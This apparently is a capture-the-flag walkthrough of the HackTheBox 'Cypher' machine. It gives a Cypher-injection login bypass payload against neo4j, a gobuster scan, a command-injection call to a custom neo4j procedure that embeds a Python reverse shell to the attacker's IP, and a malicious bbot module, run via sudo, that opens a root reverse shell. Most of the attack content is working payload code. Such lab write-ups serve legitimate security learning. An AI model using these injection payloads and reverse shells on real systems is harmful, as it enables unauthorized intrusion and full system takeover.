Login Bypass

The demo functionality it's accessible only after a login but no registration is available:

Adding a single quote (') breaks the query being performed on the backend that returns an error stack trace revealing that a cypher query on neo4j is being used; moreover, the query is returned in the error message.

This query retrieves the password hash for specified user. The hash seems to be calculated with SHA1. In order to bypass the login, the SHA1 hash of the specified password is returned in the injected query, resulting in a true evaluation when checking the hash:

{
    "username":"' or 1=1 RETURN 'd012f68144ed0f121d3cc330a17eec528c2e7d59' as hash //",
    "password": "pippo"
}

// d012f68144ed0f121d3cc330a17eec528c2e7d59 = SHA1("pippo")

RCE

Performing a directory bruteforce a /testing endpoint is found:

gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://cypher.htb

A jar file is hosted there:

By decompiling the jar with jd-gui allows to discover that it implements a custom procedure getUrlStatusCode for neo4j. This function is vulnerable to command injection:

In the search query bar, the following query is run; this query will invoke the custom procedure and open a reverse shell on the attacker machine:

CALL custom.getUrlStatusCode('http://10.10.14.39:8000/fake; python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",8090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'');

Privilege Escalation

User graphasm can run the command /usr/local/bin/bbot as super user:

After some research, bbot seems to be a tool used to perform realtime network scanning and enumeration generally used in bug bounty.

From the documentation is found that it's possible to create custom modules; the following custom module is prepared:

from bbot.modules.base import BaseModule

import socket
import os
import pty

def revshell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.39",8090))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")

class jack69(BaseModule):

    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        revshell()
        pass

    async def handle_event(self, event):
        exit(1)
